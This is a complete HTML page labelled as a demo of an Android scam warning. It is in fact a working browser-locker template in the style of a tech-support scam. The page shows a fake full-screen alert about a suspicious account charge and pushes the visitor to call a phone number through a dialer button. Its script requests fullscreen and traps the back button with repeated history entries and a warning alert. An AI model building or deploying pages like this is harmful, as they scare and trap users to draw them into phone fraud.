<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Android Scam Warning Demo</title>
<style>
  html, body {
    margin: 0; padding: 0;
    height: 100%; width: 100%;
    background: black;
    color: white;
    font-family: 'Roboto', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    user-select: none;
    overflow: hidden;
  }
  #popup {
    background: #d32f2f;
    padding: 30px;
    border-radius: 15px;
    max-width: 350px;
    text-align: center;
    box-shadow: 0 0 15px #ff5252;
  }
  #popup h1 {
    margin: 0 0 15px;
    font-size: 28px;
    font-weight: 700;
  }
  #popup p {
    font-size: 16px;
    margin-bottom: 20px;
  }
  #popup button {
    background: #b71c1c;
    border: none;
    color: white;
    font-size: 18px;
    padding: 10px 20px;
    border-radius: 8px;
    cursor: pointer;
  }
  #popup button:hover {
    background: #f44336;
  }
</style>
</head>
<body>

<div id="popup">
  <h1>⚠️ SCAM ALERT ⚠️</h1>
  <p>A suspicious charge was detected on your account. Do not share your info.<br />
     Call official support immediately.</p>
  <button onclick="callSupport()">Call Support: 888-888-8888</button>
</div>

<script>
  // Request fullscreen on page load (must be triggered by user interaction on most browsers)
  document.documentElement.requestFullscreen().catch(() => {});

  // Prevent back button normal press
  history.pushState(null, null, location.href);
  window.onpopstate = function () {
    history.pushState(null, null, location.href);
    alert("Please do not go back! This is a scam warning.");
  };

  // Call support function - opens dialer
  function callSupport() {
    window.location.href = "tel:8888888888";
  }

  // Note:
  // User can long press back button to exit fullscreen.
  // This behavior cannot be prevented by JS for security reasons.
</script>

</body>
</html>
